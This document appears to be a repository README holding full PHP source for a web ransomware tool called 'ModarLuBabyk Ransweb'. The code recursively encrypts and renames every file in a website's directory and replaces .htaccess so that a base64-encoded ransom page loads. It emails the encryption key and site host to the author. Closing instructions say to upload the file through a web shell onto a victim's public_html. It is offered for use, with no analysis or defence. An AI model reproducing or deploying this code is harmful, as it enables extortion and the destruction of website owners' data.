# ModarLuBabyk-Ransweb
ModarLuBabyk Ransweb, For Lock A Website.


<!DOCTYPE html>
<html>
<head>
   <title>./ModarLuBabyk RANSWEB</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#UMC\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page Nya Ya)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgPHRpdGxlPldlYnNpdGUgSGFzIEJlZW4gTG9ja2VkPC90aXRsZT4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPG1ldGEgbmFtZT0iQXV0aG9yIiBjb250ZW50PSJIYWNrZWQgQnkgSU5TT05FU0lBTiBFUlJPUiBTWVNURU0iIC8+CiAgPG1ldGEgbmFtZT0iY29weXJpZ2h0IiBjb250ZW50PSJJTkRPTkVTSUFOIEVSUk9SIFNZU1RFTSIgLz4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYm9keSB7CmJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly93d3cudXBsb2FkLmVlL2ltYWdlLzExNTU0MTIzLzIwOTAzNy5naWYnKTsKICAgIGJhY2tncm91bmQ6ICMxQTFDMUY7CiAgICBjb2xvcjogI2UyZTJlMjsKfQphewogICBjb2xvcjpncmVlbjsKfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8Y2VudGVyPjxpbWcgc3JjPSJodHRwczovLzEuYnAuYmxvZ3Nwb3QuY29tLy1jWVAtR2ZLcF9pQS9YcThyN1pIZTVDSS9BQUFBQUFBQUFMWS9ZVi0xamlnN0VXSUJHZWpQa0tIY3pDX2c4Tk1la1BDZndDTGNCR0FzWUhRL3MxNjAwL2ltYWdlcyUyQiUyNTI4MyUyNTI5LmpwZWciIHdpZHRoPSI1MCUiPiA8YnI+CjxwcmU+CiAgICAgIERFQVIgTUFTVEVSIERFUExPUE1FTlQgVEhJUyBXRUIKWW91ciBTaXRlIEhhcyBCZWVuIExvY2sgIEJ5IC4vTW9kYXJMdUJhYnlrCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KV2hhdCBBIFJhbnNvbXdhcmU/PGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSI+SGVyZSBJZGlvdHM8L2E+Ljxicj4KSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8gQ29udGFjdCBNZSEKLi9Nb2Rhckx1QmFieWsKZmFuYTA4MTE1NUBnbWFpbC5jb20KPC9wcmU+CjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4="))){
        echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"> </i>shor7cut.php (Default Page Nya Ya)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php,") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

      public function report($key){
        $message.= "=========  Ransomeware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= (2020) Ransomware =========\n";
        $subject = "RANSOME BY ./ModarLuBabyk";
        $headers = "Mengapa gua harus peduli? orang aja gapeduli sama gua <admin@team-ies.net>\r\n";
        mail("fana081155@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<img src="https://1.bp.blogspot.com/-cYP-GfKp_iA/Xq8r7ZHe5CI/AAAAAAAAALY/YV-1jig7EWIBGejPkKHczC_g8NMekPCfwCLcBGAsYHQ/s1600/images%2B%25283%2529.jpeg" width="50%"><br>
<pre>
              ./ModarLuBabyk | IES
   -[ Your Site Has Been Locked ! ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">INJECTION</option>
         <option value="2">BUKA KUNCI</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
</div>
</body>
</html>


- Paste On html editors 
- save format .PHP


Why To Use?
- Upload in your Shell Web
- For Call? https://site.com/yourfile.php
( Upload at Public html )


Recode? Chat me bro
For Contact : +62859175607007 / Hexsa

Thanks very Much
